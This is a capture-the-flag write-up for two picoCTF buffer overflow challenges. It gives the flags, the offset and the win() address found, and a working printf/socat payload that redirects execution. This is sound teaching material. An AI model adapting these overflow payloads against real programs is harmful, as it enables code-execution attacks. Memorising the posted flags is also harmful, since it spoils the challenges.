# buffer overflow 0

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}`

## Approach

- Connect to the instance with `$ socat - TCP4:saturn.picoctf.net:57579` and type a long string of `a`s.

```
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

&nbsp;

&nbsp;

<hr style="border:2px solid gray; background-color: gray">
&nbsp;

&nbsp;

# buffer overflow 1

**Flag:** `picoCTF{addr3ss3s_ar3_3asy_b15b081e}`

## Approach

- Inputting short strings into the program always results into jumping to the same memory location.
- Input a long string of `a`s into the program. This results in a jump to `0x61616161`, which is the hex converted `utf-8` value of the character `a`.
- Using a non-repeating pattern generator (linked in references), we can find the exact offset created by the buffer, which is 44.

![buffer-value](images/Binary%20Exploitation/buffer%20overflow%201/buffer-val.png)

- To find the memory address at which the `win()` function is stored, we can use Rizin/Cutter's 'Disassembly' tab. The address is `0x080491f6`. Since this involves typing invalid `utf-8` characters, we will have to make use of `printf` to type the hex values directly.
- `nc` cannot easily pipe into `stdin`, so we can use `socat` instead.
- Now we can connect to the remote address:
```
$ socat - TCP4:saturn.picoctf.net:56983 < <(printf "123456789012345678901234567890123456789012ab\xf6\x91\x04\x08")
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b15b081e}
```

## New concepts

1. `printf` entering hexadecimal values
2. `socat`'s working
3. Buffer overflowing to another function's values

## Incorrect methods tried

- Entering hex values directly into `stdin`
- Entering invalid `utf-8` characters into `stdin`
- Piping hex values using `echo`
- Piping the string into `nc`

## References

- https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
- https://www.codetable.net/ (https://www.codetable.net/hex/8)
- https://stackoverflow.com/a/36312514 (`socat`)
- https://stackoverflow.com/a/33702982 (`printf`)

&nbsp;

&nbsp;

<hr style="border:2px solid gray; background-color: gray">
&nbsp;

&nbsp;

